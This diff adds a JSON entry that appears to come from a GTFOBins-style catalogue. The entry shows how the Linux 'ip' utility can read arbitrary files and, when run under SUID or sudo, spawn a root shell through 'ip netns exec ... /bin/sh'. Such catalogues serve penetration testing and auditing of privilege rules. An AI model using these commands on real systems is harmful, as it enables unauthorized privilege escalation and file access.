@@ -1,0 +1,28 @@
+{
+  "description": "The read file content is corrupted by error prints.\n",
+  "functions": {
+    "file-read": [
+      {
+        "code": "ip -force -batch [file]\n"
+      }
+    ],
+    "suid": [
+      {
+        "code": "./ip -force -batch [file]\n"
+      },
+      {
+        "description": "This only works for Linux with CONFIG_NET_NS=y.",
+        "code": "./ip netns add foo\n./ip netns exec foo /bin/sh -p\n./ip netns delete foo\n"
+      }
+    ],
+    "sudo": [
+      {
+        "code": "sudo ip -force -batch [file]\n"
+      },
+      {
+        "description": "This only works for Linux with CONFIG_NET_NS=y.",
+        "code": "sudo ip netns add foo\nsudo ip netns exec foo /bin/sh\nsudo ip netns delete foo\n"
+      }
+    ]
+  }
+}
